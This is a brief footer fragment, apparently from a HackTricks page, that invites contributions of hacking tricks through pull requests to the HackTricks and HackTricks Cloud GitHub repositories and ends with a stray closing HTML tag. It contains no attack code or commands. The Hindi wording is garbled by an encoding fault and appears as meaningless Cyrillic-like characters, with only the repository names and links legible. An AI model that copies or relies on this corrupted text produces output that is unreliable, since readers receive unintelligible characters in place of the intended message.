* **HackTricks** рдХреЛ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░рдХреЗ PRs рдЬрдорд╛ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ **рдпреЛрдЧрджрд╛рди рджреЗрдВ**.

</details>
